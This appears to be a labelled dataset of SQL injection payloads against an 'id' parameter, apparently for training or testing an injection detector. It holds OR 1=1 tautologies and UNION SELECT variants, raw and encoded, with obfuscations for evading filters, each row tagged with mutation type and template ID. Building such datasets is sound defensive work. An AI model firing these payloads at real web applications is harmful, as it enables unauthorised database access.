id%3D1%27  O%72++1=1+ %2F*,1,sqli_obfuscated,comment_block_comment|ws_multi_space,partially_encoded,SQLI_OBFUSCATED_003,d6d4d6587d5b84cec0125cdb2645c0ef,ad79875e072ab4137d95221d6ae48a4e,26
id%3D1' O%72+1%3D1+#,1,sqli_obfuscated,case_var|comment_hash,partially_encoded,SQLI_OBFUSCATED_003,37f2b2d1cc9bb82b9da7e9616849c99e,9b7247444d7dea3f9790d1ca70813525,20
id%253D1%2527%252F%252Afoo%252A%252FOR%252F%252Abar%252A%252F1%253D1%252523,1,sqli_obfuscated,comment_url_hash|ws_tab,double_encoded,SQLI_OBFUSCATED_005,3d99f788361e3b93a3cbc598684fe3ea,cbec4285b71f3c0af54f6360747500eb,75
id%253D1%2527%252F%252A%252150000UNION%252A%252F%252F%252A%252150000SELECT%252A%252F1%252C2%2B%2B%252523,1,sqli_obfuscated,case_var|comment_url_hash|ws_multi_space,double_encoded,SQLI_OBFUSCATED_002,d8e90e9583ef3f477face226529bb846,6b4d5b4258842d675c5f6a3b16ad5ff1,104
id%253D1%2527%252F%252A%252150000UNION%252A%252F%252F%252A%252150000SELECT%252A%252F1%252C2%252F%252A%252A%252F%252523,1,sqli_obfuscated,case_var|comment_url_hash|ws_mixed_ws,double_encoded,SQLI_OBFUSCATED_002,3124025b55e0cf10f81a9d1083c6d501,88ea203333411c705bcbe6bc49be1804,118
"id=1'/*!50000UNION*//*!50000SELECT*/1,2 ;-- -",1,sqli_obfuscated,comment_semicolon_comment,raw,SQLI_OBFUSCATED_002,1ae4c0564499682d16d6ff8ec5145e30,78454e51fe0f3045981e3dd7723a66e9,45
id%3D1%27+union+Select+1%2C2+--,1,sqli_obfuscated,case_var|comment_dash_dash,url_encoded,SQLI_OBFUSCATED_004,f9c695a7d67eea1a68b5711bd155ac58,ecce8b1b44b6fdf937cc8732817a18c3,31
id%253D1%2527%252F%252A%252A%252FUnion%252F%252A%252A%252FSELeCT%252F%252A%252A%252F1%252C2%252F%252A%252A%252F%252523,1,sqli_obfuscated,case_var|comment_url_hash|ws_comment_ws,double_encoded,SQLI_OBFUSCATED_004,4a1901ea9bf7ec0304b3aa7f6dcea1cc,ef1e42d402f188dfedf747155fb53e70,118
id%3D1%27%2F%2A%2A%2FUnioN%2F%2A%2A%2Fselect%2F%2A%2A%2F1%2C2%2F%2A%2A%2F%23,1,sqli_obfuscated,case_var|comment_hash|ws_comment_ws,url_encoded,SQLI_OBFUSCATED_004,030d123ff31472a6d17f0a18c05fd0a5,615f84e1cc3ce2099c46ea1b9b7e78b1,76
"id%3D1%27%2F%2A!50000UNION%2A%2F/%2A!50000SELECT%2A%2F1,2+/%2A",1,sqli_obfuscated,comment_block_comment|ws_space,partially_encoded,SQLI_OBFUSCATED_002,c0587d944ab51372562c406acfa1e5f0,54df9e50870664be366ac4d2b10cbd8a,62
id%3D1%27%2BUNION%2Bselect%2B1%2C2%2B%23,1,sqli_obfuscated,case_var|comment_hash|ws_plus,url_encoded,SQLI_OBFUSCATED_004,65e57fbe9cb114d976e0863cad7658a9,4f4f19e1929e0a4f4691af235b62fa14,40
id%253D1%2527%252F%252A%252A%252Funion%252F%252A%252A%252FSELECT%252F%252A%252A%252F1%252C2%252F%252A%252A%252F--,1,sqli_obfuscated,case_var|comment_dash_dash|ws_comment_ws,double_encoded,SQLI_OBFUSCATED_004,b908602bc8b7addba228d320ef77474b,e1903a81ef2be8aad6ce9a8e1ae76ba7,113
id%3D1%27%2F%2Afoo%2A%2FOR%2F%2Abar%2A%2F1%3D1--%2B-,1,sqli_obfuscated,case_var|comment_dash_dash_space|ws_plus,url_encoded,SQLI_OBFUSCATED_005,c1361b7921d875a182d3920781d62891,2f42e5efd25353464e2f5c57cd5fb08e,52
"id=1%27%2F%2A!50000UNION*/%2F%2A!50000SELECT%2A%2F1,2	;--	-",1,sqli_obfuscated,case_var|comment_semicolon_comment|ws_tab,partially_encoded,SQLI_OBFUSCATED_002,eb8c039b0e635702603998cecd2d3ed3,a7027b039984b6eb9c2667df815a7902,59
"id%3D1%27%2F%2A!50000UNION%2A%2F%2F%2A!50000SELECT*/1,2 -- -",1,sqli_obfuscated,case_var|comment_dash_dash_space,partially_encoded,SQLI_OBFUSCATED_002,6ae4e6033e36e8ab803d08d4e3f4a656,9ef79a5bbbe01ffe7e2f956d9d27c5e8,60
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%2520%3B--%2520-,1,sqli_obfuscated,case_var|comment_semicolon_comment|ws_url_space,url_encoded,SQLI_OBFUSCATED_001,4af9f0f6f44627e3f7d2f7574c35b687,aa51ef94a000815bf3b1570a8ae924c7,56
id%3D1%27	OR	1=1#%3B--	-,1,sqli_comment_var,comment_semicolon_comment|ws_tab,partially_encoded,SQLI_COMMENT_VAR_003,e12c824a14676af4ecf91c78cf1a44ae,0978009585521d95642ec3a8cb735ece,24
id%3D1%27%09OR%091%3D1%23--%09-,1,sqli_comment_var,comment_dash_dash_space|ws_tab,url_encoded,SQLI_COMMENT_VAR_003,8db9fde928baead2f25895aaa4f82d14,d544f361945c5fb8f93c03aacf0c0765,31
id%3D1%27%2F%2A%2A%2FOr%2F%2A%2A%2F1%3D1%3B--,1,sqli_comment_var,case_var|ws_comment_ws,url_encoded,SQLI_COMMENT_VAR_005,191a13c6341fe9b0c93bcdbf90565188,8ed61fdc942e9490bd8a20c4f1e01bb4,45
id%3D1%27%2F%2A%2A/OR%2F%2A*%2F1%3D1--,1,sqli_comment_var,ws_comment_ws,partially_encoded,SQLI_COMMENT_VAR_001,e2be21dc9ef3f1fd28b5c496af5a1fec,d9bfe91c646d3a8c6406ecf6b8c15766,38
id=1' or 1=1#,1,sqli_comment_var,case_var|ws_space,raw,SQLI_COMMENT_VAR_003,6792288ad6740bcda78594996f976047,634bdaa23c0eaeaeb92b36deeabe5503,13
id=1%27+OR+1=1--,1,sqli_comment_var,standard,partially_encoded,SQLI_COMMENT_VAR_001,0382ae6020360341da734d4605dc0312,988e757e1bde1325b7adab75e3a03254,16
id%253D1%2527%2BOR%2B1%253D1--%2B-%2523,1,sqli_comment_var,case_var|comment_hash,double_encoded,SQLI_COMMENT_VAR_002,a640afc37ae4cd75caade4473a9e9b4b,2e136bda4ed0d649f74a64be5c203ff0,39
id%3D1' OR+1=1%3B--,1,sqli_comment_var,case_var,partially_encoded,SQLI_COMMENT_VAR_005,cf4c2bb4e72669bbc4ac0e147f22f44a,162c3e845219c84645b97cc66e154270,19
id%253D1%2527%2BOr%2B1%253D1--%2B---,1,sqli_comment_var,case_var|comment_dash_dash,double_encoded,SQLI_COMMENT_VAR_002,c55ba8790b7285043102f6c1d6c349aa,62a68eecd04332d927cbbe647f5ecd01,36
id%3D1%27+Or+1%3D1--,1,sqli_comment_var,case_var|ws_space,url_encoded,SQLI_COMMENT_VAR_001,5948cd4878c7a9df6a5ef64d4c28dfae,bbf0425e067162ba9d315cae41a40d49,20
id%253D1%2527%2BOR%2B1%253D1--%2B-,1,sqli_comment_var,ws_space,double_encoded,SQLI_COMMENT_VAR_002,4bd07d44d8c42512b9ebb95fef4d9519,63e6a0950d64afdda0648f8cfce521bb,34
id%3D1%27++or++1%3D1%23,1,sqli_comment_var,case_var|ws_multi_space,url_encoded,SQLI_COMMENT_VAR_003,2b4e04bc79a112d700f40a01bd9322b9,43aa549ab45e6953576c5a2a14f4d3ea,23
id%3D1%27  OR+ 1%3D1;--%2F*,1,sqli_comment_var,comment_block_comment|ws_multi_space,partially_encoded,SQLI_COMMENT_VAR_005,d4aa815cef25c760177de2af9b1b6b62,bf8f5d04cd3687f07bface4a5b2255df,27
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%23--,1,sqli_comment_var,comment_dash_dash|ws_comment_ws,url_encoded,SQLI_COMMENT_VAR_003,6cd37a84e3e3960b4091084f930e182f,7ca49394debf50b479c2d8811c485e3e,45
id=1'  Or  1=1;--,1,sqli_comment_var,case_var|ws_multi_space,raw,SQLI_COMMENT_VAR_005,bdf34a7e50a98e86dd089c565dc1cf85,57458cb9718a0e9038621a60931220e9,17
id%253D1%2527%2B%2BOR%2B%2B1%253D1--%252F%252A,1,sqli_comment_var,case_var|comment_block_comment|ws_multi_space,double_encoded,SQLI_COMMENT_VAR_001,2f5400a90b96a2979e56e201e3ad96fa,9b9c596736a2b5f733776893a6bb0582,46
id%3D1%27%20OR%201%3D1#,1,sqli_comment_var,ws_url_space,partially_encoded,SQLI_COMMENT_VAR_003,27c0589606ae2d488d18745172a961d7,d4ede3e9a27165070388fb5cc1bdd782,23
id%3D1'/%2A%2A%2FOR%2F*%2A/1%3D1%23%23,1,sqli_comment_var,comment_url_hash|ws_comment_ws,partially_encoded,SQLI_COMMENT_VAR_003,822c4f7753a803580387920f07709ffe,d15a9f48da3d8c0d0034fcbc7c8c34bf,38
id=1'%20or%201=1--,1,sqli_comment_var,case_var|ws_url_space,raw,SQLI_COMMENT_VAR_001,279bde5e415c491805263b110b900afd,279bde5e415c491805263b110b900afd,18
id%3D1%27+OR+1=1%2F*--,1,sqli_comment_var,case_var|comment_dash_dash|ws_plus,partially_encoded,SQLI_COMMENT_VAR_004,9fa8f3f5d817dd6330f0c9652030665f,075e5874f4a330e50dd7a7dd07b9e5c6,22
id=1%27+OR+1%3D1%2F%2A--,1,sqli_comment_var,comment_dash_dash|ws_plus,partially_encoded,SQLI_COMMENT_VAR_004,5d1b49b4a7e991052ee60189ee0f4e1a,458e1720d2e719d8e3b113175b8255a2,24
id%3D1%27%2F%2A%2A%2For%2F%2A%2A%2F1%3D1%23,1,sqli_comment_var,case_var|ws_comment_ws,url_encoded,SQLI_COMMENT_VAR_003,7f82cace40281e390d2ebf23af5a3f4f,02fa865ebec79aca90bb32474e78e619,43
id%3D1%27+ or+ 1%3D1;--,1,sqli_comment_var,case_var|comment_dash_dash|ws_multi_space,partially_encoded,SQLI_COMMENT_VAR_005,f4efc00e1b46e2f543f1a3122960ed06,0e49f991bfe8ac840ca6e9e9f7e75648,23
id=1'/**/or/**/1=1#,1,sqli_comment_var,case_var|ws_comment_ws,raw,SQLI_COMMENT_VAR_003,f0fbec9f4a19c718ad0bca2955f1cc14,f0fbec9f4a19c718ad0bca2955f1cc14,19
id%3D1%27+or+1=1----+-,1,sqli_comment_var,case_var|comment_dash_dash_space|ws_plus,partially_encoded,SQLI_COMMENT_VAR_001,47cd279550bd0f02f12c2682969ff7eb,df8c2ca9372a38aca68a1b68d3332907,22
id%253D1%2527%2BOR%2B1%253D1--%2523,1,sqli_comment_var,comment_hash|ws_space,double_encoded,SQLI_COMMENT_VAR_001,33720baa2055cfe89fffd594f5192f40,c484b88ad33ee613e33e6cba54844184,35
id%3D1%27+OR+1%3D1--+-,1,sqli_comment_var,standard,url_encoded,SQLI_COMMENT_VAR_002,76ddc1df18a312555b73dde33c08b08c,a13de12a99d6737d4f155b402a4ff18f,22
id%3D1%27	or	1%3D1%2F%2A,1,sqli_comment_var,case_var|ws_tab,partially_encoded,SQLI_COMMENT_VAR_004,7d10911d39f03709f71c7b66d0a5f099,c2ac5352383ca0fb9cc495941c63ed41,24
id=1'%20OR%201=1/*--%20-,1,sqli_comment_var,case_var|comment_dash_dash_space|ws_url_space,raw,SQLI_COMMENT_VAR_004,a2406f1471e920c9ddc9eeb6de171b19,9a04fe9f27e5611d4ecb1ccf6b64a449,24
id%3D1%27	Or	1=1#--,1,sqli_comment_var,case_var|comment_dash_dash|ws_tab,partially_encoded,SQLI_COMMENT_VAR_003,b72db4933016edf807e9e2af599d5080,c20ad3535f3ae5c9b07bb3cfcd0002b2,19
id%3D1%27%2520OR%25201%3D1%3B--%2F%2A,1,sqli_comment_var,comment_block_comment|ws_url_space,url_encoded,SQLI_COMMENT_VAR_005,af2ae0c7120fbb2a18a03fe1deb37e26,cd031e77ed9011cb71f44b6ffb689f2d,37
id%3D1%27+OR+1%3D1%3B--,1,sqli_comment_var,standard,url_encoded,SQLI_COMMENT_VAR_005,b03416dbbbfeb08f279d73abe3bb79f0,4bd44935d710494c9fa3c77e87daae33,23
id=1' OR 1=1-- -,1,sqli_comment_var,standard,raw,SQLI_COMMENT_VAR_002,6df50e83f95fc3c96fb08034cf01df26,c6ffc9ec5440ca24b48f557c63d92cef,16
id=1' oR 1=1/*,1,sqli_comment_var,case_var,raw,SQLI_COMMENT_VAR_004,dc006e8dd2feb29d831edddf49573139,9f65263cc09d3ae53a328efcda5dc67a,14
id%253D1%2527%252BOr%252B1%253D1--%252B-%252523,1,sqli_comment_var,case_var|comment_url_hash|ws_plus,double_encoded,SQLI_COMMENT_VAR_002,d66cde9975bb1ee161449cbebdddbacc,4a2354c4ccfd9c61df5c0b7b43da20d1,47
id%3D1%27+Or+1%3D1--%2F%2A,1,sqli_comment_var,case_var|comment_block_comment,url_encoded,SQLI_COMMENT_VAR_001,fb062d54b4637006ffa69cceb7727551,2e371514b8a0e6d5df42b572466efe95,26
id%253D1%2527%252520or%2525201%253D1--%253B--%252520-,1,sqli_comment_var,case_var|comment_semicolon_comment|ws_mixed_ws,double_encoded,SQLI_COMMENT_VAR_001,27c482fb702eca599852b093459c32cc,4ffc973b69eb45672227a5ee9d615dcc,53
id%3D1%27+OR+1%3D1--%2523,1,sqli_comment_var,comment_url_hash,url_encoded,SQLI_COMMENT_VAR_001,bab50fbd8d7c6993e28e505a4f299324,c1b03c8171294ef1d8b81f1ec614fe44,25
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%2F%2A,1,sqli_comment_var,ws_comment_ws,url_encoded,SQLI_COMMENT_VAR_004,2d85e57b7bc81e35b4fdd3dc96ad5b53,6e0e835649d50c2a5152909e6fccbb19,46
id%3D1%27%20or%201=1%3B--,1,sqli_comment_var,case_var|ws_url_space,partially_encoded,SQLI_COMMENT_VAR_005,d7fcfbbfed933ea0a7ae0ebf333222b9,d8b2819185038f206217c6d6de7c96e7,25
id%3D1%27+oR+1%3D1%23--,1,sqli_comment_var,case_var|comment_dash_dash,url_encoded,SQLI_COMMENT_VAR_003,1343973da91fb5618ce19162c1ce211e,042a22fcfd9fffb5cd8c59423f39b818,23
id=1' OR 1=1/*#,1,sqli_comment_var,case_var|comment_hash,raw,SQLI_COMMENT_VAR_004,69f725c9c1523298fbecbfa66d0677a6,5ea0a21cf5dcfe8d21b3542684783a49,15
id%3D1%27%2F%2A%2A%2For%2F%2A%2A%2F1%3D1%2F%2A--%2F%2A%2A%2F-,1,sqli_comment_var,case_var|comment_dash_dash_space|ws_comment_ws,url_encoded,SQLI_COMMENT_VAR_004,251ce0e0b50da57df998a36152f02edf,e6652dc0ade05491cc655c0b176cf732,61
id=1' OR 1=1-- -#,1,sqli_comment_var,comment_hash,raw,SQLI_COMMENT_VAR_002,70a948bd82aff6a8879263644540fd42,9f6781d2dc61640ca192a56f74c9e0ad,17
id=1' or 1=1--%23,1,sqli_comment_var,case_var|comment_url_hash|ws_space,raw,SQLI_COMMENT_VAR_001,c4b6d6780c980300b53b559380ef84bb,1314cb954e652b0ebcfb69b5a1f723cf,17
id=1'+Or 1%3D1/%2A%23,1,sqli_comment_var,case_var|comment_url_hash,partially_encoded,SQLI_COMMENT_VAR_004,d0267d7fd9722ea820f085ae019e569c,a7c3f0ec0c4ceb15c2ab403831b0a62b,21
id%3D1%27 OR+1%3D1/*--,1,sqli_comment_var,comment_dash_dash,partially_encoded,SQLI_COMMENT_VAR_004,b5718abf3bfb38c9a7a3cad8f3c6cd7c,e6f00904dc5856b88048125adf38c498,22
id=1'%20Or%201=1%2F%2A%23,1,sqli_comment_var,case_var|comment_hash|ws_url_space,partially_encoded,SQLI_COMMENT_VAR_004,f220ad7673c3495e348add7780835803,2d185503b31cf66d12e0d6ecc0b017c1,25
id=1'  or  1=1--,1,sqli_comment_var,case_var|ws_multi_space,raw,SQLI_COMMENT_VAR_001,dfc4b17bfe1e8708fbed9d99a23590e1,655e6f8c4275bd221ce0696d30212658,16
id%253D1%2527%2BOR%2B1%253D1%252F%252A,1,sqli_comment_var,standard,double_encoded,SQLI_COMMENT_VAR_004,1bb59ea56abf36ba0ef723e608ed9b1f,49c74c7cd4c26decbab74446d10db24b,38
id=1'%20OR%201=1/*,1,sqli_comment_var,ws_url_space,raw,SQLI_COMMENT_VAR_004,2164ed96bd6dfa163a8735257d35baa8,403b6790e573b6c13fd72460aaff60f6,18
id%3D1%27 Or+1=1%3B--%3B--+-,1,sqli_comment_var,case_var|comment_semicolon_comment|ws_space,partially_encoded,SQLI_COMMENT_VAR_005,2e4ef98d6daa0a5b04e2078760f2a779,e37b9a0a88a2ad3084d3e404c4013762,28
id%3D1'+ Or +1%3D1;--%23,1,sqli_comment_var,case_var|comment_url_hash|ws_multi_space,partially_encoded,SQLI_COMMENT_VAR_005,d5c8614ad4d7f12670ae3013263214f0,e555505a6baf1785d0c40c9099968430,24
id%253D1%2527%2B%2Bor%2B%2B1%253D1%253B--%253B--%2B%2B-,1,sqli_comment_var,case_var|comment_semicolon_comment|ws_multi_space,double_encoded,SQLI_COMMENT_VAR_005,d09940be0f6c4d009fdec2f25a923922,3d083d3ee7dfdd61a29a1acdec98d01f,55
id%253D1%2527%2BOr%2B1%253D1--%252F%252A,1,sqli_comment_var,case_var|comment_block_comment,double_encoded,SQLI_COMMENT_VAR_001,366303fb1405eb53ca56681bb2d934c5,5596c07f6eac4b1c68aaa2a8a1d81dd7,40
id%253D1%2527%2BOR%2B1%253D1%253B----%2B-,1,sqli_comment_var,comment_dash_dash_space,double_encoded,SQLI_COMMENT_VAR_005,16a5135cf0b5846fc9ca72036a086a45,af6eab8baaeb535ed6e6d305f6c57b76,41
id%3D1'	OR	1%3D1%23--,1,sqli_comment_var,comment_dash_dash|ws_tab,partially_encoded,SQLI_COMMENT_VAR_003,1ed461ee12208aeec81b1c615e7b9955,7825a08cf1f70e4c6dc18167ca1270dc,21
id=1'	OR	1=1--;--	-,1,sqli_comment_var,comment_semicolon_comment|ws_tab,raw,SQLI_COMMENT_VAR_001,5d09240ab06ea72a3a5f416f11112912,6ffeb842e7c4bf0d3a58a9fc992d6254,19
id%3D1%27%09Or%091%3D1--%09-,1,sqli_comment_var,case_var|comment_dash_dash_space|ws_tab,url_encoded,SQLI_COMMENT_VAR_002,0b047075044caf130d2333c013a764ca,53b436476bcb5b5457a74ffafdeef21c,28
id=1'/**/Or/**/1=1--,1,sqli_comment_var,case_var|ws_comment_ws,raw,SQLI_COMMENT_VAR_001,293c54eb02654ba837df09f67821d2be,7ed8788a2beaa6a19b4c6748d1d3baa6,20
id=1'	or	1=1;--%23,1,sqli_comment_var,case_var|comment_url_hash|ws_tab,raw,SQLI_COMMENT_VAR_005,79da834b014fdabefc4c05d554ad9241,93c2c53b45a3df90492da40f2b6b92c5,18
id%253D1%2527%2BOR%2B1%253D1%253B--,1,sqli_comment_var,case_var|ws_space,double_encoded,SQLI_COMMENT_VAR_005,8c926a42acd40bd646827eb28a759595,d724acbea2d2b27ebc9659c537077cdb,35
id=1%27+OR+1%3D1%2F*%23,1,sqli_comment_var,comment_hash|ws_plus,partially_encoded,SQLI_COMMENT_VAR_004,0d280a24670d3fe4365a2e1be5bcba18,9e773aa5c234813a03e002b810b93ac5,23
id%3D1%27+OR+1%3D1--+-;--+-,1,sqli_comment_var,case_var|comment_semicolon_comment|ws_space,partially_encoded,SQLI_COMMENT_VAR_002,df3bed0235ab120d335927be76339d07,fe954c2c0f115929f0780cc8c9e65993,27
id=1'%20Or%201=1--#,1,sqli_comment_var,case_var|comment_hash|ws_url_space,raw,SQLI_COMMENT_VAR_001,fcacc239467be64f3df9a38c0b444896,09c3ef97c178dfa8e10b68353da5c4a9,19
id=1%27+OR+1=1%3B--%23,1,sqli_comment_var,comment_url_hash,partially_encoded,SQLI_COMMENT_VAR_005,ec6a7f87aa93e25c5e42442691d3b9d9,49333d7f810e1dd148fdf58aa89aa92a,22
id%3D1%27+Or+1%3D1%23,1,sqli_comment_var,case_var|ws_space,url_encoded,SQLI_COMMENT_VAR_003,f834826efebeb30772161057dbed09f9,2d17e210884c2cd77e867e5159336961,21
id%253D1%2527%2BOR%2B1%253D1%2523%253B--%2B-,1,sqli_comment_var,case_var|comment_semicolon_comment,double_encoded,SQLI_COMMENT_VAR_003,d65ede58de603d0b18ca050f6114e066,511ed300b39fdfa36d68c3857d7b3b00,44
id%253D1%2527%2B%2BOr%2B%2B1%253D1%2523,1,sqli_comment_var,case_var|ws_multi_space,double_encoded,SQLI_COMMENT_VAR_003,5788151d81a0c8ca5b6b660d2e5bc7d2,7e6e4bef0efd248acd612a69b70fcbd1,39
id=1'  OR  1=1/*%23,1,sqli_comment_var,comment_url_hash|ws_multi_space,raw,SQLI_COMMENT_VAR_004,adaed5ba3eefb89e5268a66bc09cd9a4,f8fdc05819198702a91e938401074c70,19
id%253D1%2527%2BOR%2B1%253D1--,1,sqli_comment_var,standard,double_encoded,SQLI_COMMENT_VAR_001,6c27df5667223fcc10910ce6e4b07d84,5e46d9dc51bb9370d3e8b7bf7ead2db4,30
id=1'+OR+1%3D1--,1,sqli_comment_var,standard,partially_encoded,SQLI_COMMENT_VAR_001,cb89b5f74556364f3f20bf97e9f6b9e2,77a4b0f383078a3871225571916ef250,16
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%2F%2A%3B--%2F%2A%2A%2F-,1,sqli_comment_var,case_var|comment_semicolon_comment|ws_mixed_ws,url_encoded,SQLI_COMMENT_VAR_004,cf9afa58dc9aac3349fabe571b72f490,f847d15f2c3e3b0471d68cf4450232af,64
id%253D1%2527%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D1%2523%252523,1,sqli_comment_var,case_var|comment_url_hash|ws_comment_ws,double_encoded,SQLI_COMMENT_VAR_003,bda7467b79d652aab666e287211115ed,026b89b875a86bd8d160f7496bd6eb05,74
id=1'%20OR%201=1--;--%20-,1,sqli_comment_var,case_var|comment_semicolon_comment|ws_url_space,raw,SQLI_COMMENT_VAR_001,794512fb21628dd7040a6188a42590b9,332cd5eb5f29c2f59b6523145bf91238,25
id=1'/**/or/**/1=1;--,1,sqli_comment_var,case_var|ws_mixed_ws,raw,SQLI_COMMENT_VAR_005,f858865aab95c3968aafc32dc8ecd44c,f858865aab95c3968aafc32dc8ecd44c,21
id%253D1%2527%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D1%252F%252A--%252F%252A%252A%252F-,1,sqli_comment_var,case_var|comment_dash_dash_space|ws_mixed_ws,double_encoded,SQLI_COMMENT_VAR_004,f0abe531f3b63c4c3ae4720333d2a2d5,2dadd04f67e1dae82a24429bfdc688c0,95
id=1%27%20Or%201=1%23,1,sqli_comment_var,case_var|ws_url_space,partially_encoded,SQLI_COMMENT_VAR_003,6b53607d4c5e66e6c723d2e31014df8d,c878165d05fef2636e065f6bea026f39,21
id%3D1%27++OR++1%3D1%3B--%2523,1,sqli_comment_var,case_var|comment_url_hash|ws_multi_space,url_encoded,SQLI_COMMENT_VAR_005,652800880deaf330efc9df1b57b38f67,5dc3d0579fa38f41df8505b2c71c2cb1,30
id%253D1%2527%252BOr%252B1%253D1--%2523,1,sqli_comment_var,case_var|comment_hash|ws_plus,double_encoded,SQLI_COMMENT_VAR_001,84b1fdafab0f5f15c65141fdd9ebebb9,b5835dc0424469461fd780d0abe32748,39
id%253D1%2527%252BOR%252B1%253D1%253B--,1,sqli_comment_var,ws_plus,double_encoded,SQLI_COMMENT_VAR_005,3c9e9999a71ced7e9b89250011d7756d,fd9996bde594e494f810226c0c1f60c1,39
id%253D1%2527%2BOR%2B1%253D1----%2B-,1,sqli_comment_var,comment_dash_dash_space,double_encoded,SQLI_COMMENT_VAR_001,3376d10f7661cf98a1c1f28cecff68dd,06fbd5ec9e3679e870f270d88515c111,36
id%3D1'+oR+1%3D1--,1,sqli_comment_var,case_var,partially_encoded,SQLI_COMMENT_VAR_001,a03f0ce680a7f6ff36a1b3b9599fe87a,9d88047dc71d5031cf89ac2fc4750f0d,18
id%3D1'++or++1%3D1%23,1,sqli_comment_var,case_var|ws_multi_space,partially_encoded,SQLI_COMMENT_VAR_003,665f27c6b22a7f57d223ec239e7da972,b668ecf3c0338ffdd2d38fe922a2c8b4,21
id%3D1%27 OR 1=1--,1,sqli_comment_var,case_var,partially_encoded,SQLI_COMMENT_VAR_001,09079a96fea576c2055c2e7475ea03a8,b2120f4a70b02579e0461900bb8dc882,18
id=1'+OR+1%3D1--+-,1,sqli_comment_var,comment_dash_dash_space|ws_space,partially_encoded,SQLI_COMMENT_VAR_002,8105a50662af68a73c9945029d31432c,2fe483d69e8f24cd652eb4cf392eaece,18
id%3D1%27%09Or%091%3D1%2F%2A--%09-,1,sqli_comment_var,case_var|comment_dash_dash_space|ws_tab,url_encoded,SQLI_COMMENT_VAR_004,d51fc726eca4af8012c53107291ca82b,66594fb422b5577da4d4e9a36d5991da,34
id%3D1%27%09OR%091%3D1%3B--,1,sqli_comment_var,ws_tab,url_encoded,SQLI_COMMENT_VAR_005,1ca14eb91af9996d10975e46e708e8c9,68bc73d2e1a033b20deba14e55073b48,27
id%3D1%27%09oR%091%3D1%3B--%2523,1,sqli_comment_var,case_var|comment_url_hash|ws_tab,url_encoded,SQLI_COMMENT_VAR_005,e424f920f515585b4bae4d30b718bfc2,b3ae004eb2492243bc257b1fd0ea7ce3,32
id%3D1%27+or 1=1/*,1,sqli_comment_var,case_var,partially_encoded,SQLI_COMMENT_VAR_004,1aac4e0736cd755dc41194489edef0cc,bcbbd9626cb3ffcb38a928baf6384b26,18
id=1' or 1=1/*--,1,sqli_comment_var,case_var|comment_dash_dash|ws_space,raw,SQLI_COMMENT_VAR_004,d0c56ad83a685dbfda7f06cf25d542f5,d1bc17352b7d83cef4045908380b8e26,16
id%253D1%2527%2B%2BOR%2B%2B1%253D1%2523--%2B%2B-,1,sqli_comment_var,case_var|comment_dash_dash_space|ws_multi_space,double_encoded,SQLI_COMMENT_VAR_003,1e40367f4e8005c53eef1d1ee6888e6e,679bd3793b3c74f95d51e1afea2b6358,48
id%3D1'+OR+1=1--;--+-,1,sqli_comment_var,comment_semicolon_comment|ws_plus,partially_encoded,SQLI_COMMENT_VAR_001,c3bc6295cd0a57b61eee029a29e4fc2c,2534814952a416a562601c8f372c9b0c,21
id=1%27%2F*%2A/Or%2F%2A*%2F1%3D1%23%3B--/*%2A%2F-,1,sqli_comment_var,case_var|comment_semicolon_comment|ws_comment_ws,partially_encoded,SQLI_COMMENT_VAR_003,913469a529b37f33fb4a9db1e80c88c8,111bbed333b136bf36a2c601d38b20ca,49
id=1'%20OR%201=1--%20-,1,sqli_comment_var,case_var|ws_mixed_ws,raw,SQLI_COMMENT_VAR_002,94deb5bf3f52211bceac1bbcee673684,d220a6ea94f75607d54024c2b60dbadd,22
id%253D1%2527%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D1%252F%252A,1,sqli_comment_var,case_var|comment_block_comment|ws_comment_ws,double_encoded,SQLI_COMMENT_VAR_004,59fa20e0017d837ec4191b2281b16624,e4debc27ac330c70b23feb2bba2da9e6,72
id%3D1%27+OR+1%3D1%2F%2A,1,sqli_comment_var,comment_block_comment|ws_space,url_encoded,SQLI_COMMENT_VAR_004,42fd53ad0ca48c7c68c0c576e93bf16b,ebc71761fa9476b51d6253ba81ed337a,24
id%3D1%27+Or+1%3D1%3B--%2523,1,sqli_comment_var,case_var|comment_url_hash,url_encoded,SQLI_COMMENT_VAR_005,90c84456ab7a547ba7750aade229072d,b1fa3c7afb3b05579d7bcdf43472ddea,28
id%3D1%27++OR++1%3D1--++-,1,sqli_comment_var,comment_dash_dash_space|ws_multi_space,url_encoded,SQLI_COMMENT_VAR_002,04991456ebef36ae9e7c03ccaa0a27cc,90e05962dd922f7ace55e385b17e7d06,25
id%3D1%27%2Bor%2B1%3D1--%2B---,1,sqli_comment_var,case_var|comment_dash_dash|ws_plus,url_encoded,SQLI_COMMENT_VAR_002,2350d8ebe8c90ef6e929c7ad52cfb876,78b8b9443d8b7e3f343c72ff8b135999,30
id=1'%20OR%201=1%23,1,sqli_whitespace_var,case_var|comment_url_hash|ws_plus,raw,SQLI_WHITESPACE_VAR_003,c3dd69fd06a5fa41105dbee5a20122c9,f68b9e56acc90299c89a66dc559f2335,19
id%253D1%2527%2509OR%25091%253D1%252523,1,sqli_whitespace_var,comment_url_hash|ws_url_space,double_encoded,SQLI_WHITESPACE_VAR_004,c57fadbecc2a4568aaa7e851b5e6766a,2cb3b51351387b4c37a0d4441828c80f,39
id%3D1'	OR	1%3D1%23,1,sqli_whitespace_var,case_var|comment_hash,partially_encoded,SQLI_WHITESPACE_VAR_004,b6f60331dee522cf6fe3843f415a81bb,307cc6c154077de7be3ba0742e55dd88,19
id%3D1%27%2520OR%25201%3D1,1,sqli_whitespace_var,case_var|ws_comment_ws,url_encoded,SQLI_WHITESPACE_VAR_003,1c023194dcbe5a8050e39dae5be8375f,7c6c023ca5b88d47b092b78c1a27b8ce,26
id=1'  OR   1=1,1,sqli_whitespace_var,standard,raw,SQLI_WHITESPACE_VAR_001,c59a4557ebbd26f3140c8272f61b2652,acc3a4fb7ad2f04c69da120cfa50d949,15
id%3D1%27%20OR%201%3D1,1,sqli_whitespace_var,case_var,partially_encoded,SQLI_WHITESPACE_VAR_003,cd4f0fd64fdee3973e7928262cb79ada,cc16091113554d66ad66b5a884efc78f,22
id=1%27	OR	1=1%3B-- -,1,sqli_whitespace_var,case_var|comment_semicolon_comment,partially_encoded,SQLI_WHITESPACE_VAR_004,9c8d5f0e30cd9abfeadc10cb865f1e5f,c16155a43a1823c16c4d41ea84807fa9,21
